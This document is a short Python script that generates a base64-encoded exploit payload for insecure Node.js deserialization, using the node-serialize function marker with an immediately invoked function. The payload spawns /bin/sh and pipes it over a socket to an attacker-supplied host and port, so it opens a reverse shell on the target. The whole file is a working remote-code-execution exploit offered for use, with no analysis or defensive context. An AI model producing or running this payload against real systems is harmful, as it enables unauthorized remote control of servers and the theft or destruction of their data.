#!/usr/bin/python3
import base64
import sys

if len(sys.argv) != 3:
	print('usage: %s lhost lport'%sys.argv[0])
	sys.exit(-1)

lhost = sys.argv[1]
lport = sys.argv[2]

payload = b'{"msg":"_$$ND_FUNC$$_function(){'
payload += b'var net = require(\'net\'),cp = require(\'child_process\'),'
payload += b'sh = cp.spawn(\'/bin/sh\',[]); var client= new net.Socket();'
payload += b'client.connect(%s, \'%s\', function() {'%\
	(lport.encode('utf-8'),lhost.encode('utf-8'))
payload += b'client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);'
payload += b'});return /rce/'
payload += b'}()"}'

print(base64.b64encode(payload).decode('utf-8'))
